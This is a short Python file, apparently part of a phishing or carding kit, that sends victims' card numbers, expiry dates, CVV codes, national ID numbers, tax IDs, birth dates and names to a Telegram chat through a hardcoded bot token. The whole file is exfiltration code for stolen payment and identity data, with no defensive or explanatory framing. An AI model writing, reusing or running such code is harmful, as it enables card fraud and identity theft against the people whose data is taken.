import telebot

TOKEN = '8557374921:AAEl5Hk2cgfTUzStfYGB21dOh03u9rERIyo'
CHAT_ID = "-5243465768"
bot = telebot.TeleBot(TOKEN)

def enviar_telegram(numcc, exp, cvv, dni, name, info_date):

    mensaje = (
        f"📊 NUEVA CC\n\n"
        f"Tarjeta: {numcc}\n"
        f"MM/AA: {exp}\n"
        f"CCV: {cvv}\n\n"
        f"DNI: {dni}\n\n"
        f"Nombre: {name}\n\n"

        f" -- INFORMACIÓN -- \n\n"

        f"Nombre completo: {info_date[0]['nombrecompleto']}\n"
        f"Cuit: {info_date[0]['cuit']}\n"
        f"DNI: {info_date[0]['dni']}\n"
        f"Fecha de Nacimiento: {info_date[0]['fechanacimiento']}\n"
        f"Sexo: {info_date[0]['sexo']}\n"

        f"<--SABBATH-->"
    )
    bot.send_message(CHAT_ID, mensaje)
